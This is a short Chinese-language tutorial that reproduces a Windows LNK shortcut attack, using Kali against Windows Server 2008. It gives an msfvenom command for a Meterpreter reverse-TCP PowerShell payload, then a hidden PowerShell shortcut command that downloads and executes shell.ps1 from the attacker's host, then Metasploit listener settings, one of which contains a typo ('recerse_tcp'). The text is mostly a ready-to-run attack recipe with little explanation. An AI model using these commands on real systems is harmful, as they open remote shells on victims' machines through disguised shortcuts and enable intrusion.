**0x00漏洞成因**  

    在windows中快捷方式LNK文件小巧，打开程序方便。但是也会因为漏洞造成很大影响，比如远程命令执行。

**0x01漏洞复现**  

    攻击机：kali 2.0  

    目标机：windows server 2008

1.在kali上生成木马

    msfvenom -p windows/x64/meterpreter/reverse\_tcp  LHOST=192.168.155.6 LPORT=4444 -f psh-reflection > shell.ps1  

2.建立快捷方式

    在windows 桌面上右击 ==》 创建快捷方式

![](../Images/5fcb25bf20b5cfec6b95b746a1f80115.png)

**payload**:powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.155.6/shell.ps1');shell.ps1"  

![](../Images/c772c57517c0c2cf853cff25811a8e6c.png)

结果生成一个shell.txt的快捷方式

set payload windows/x64/meterpreter/recerse\_tcp

set lhost 192.168.155.6

set lport 4444
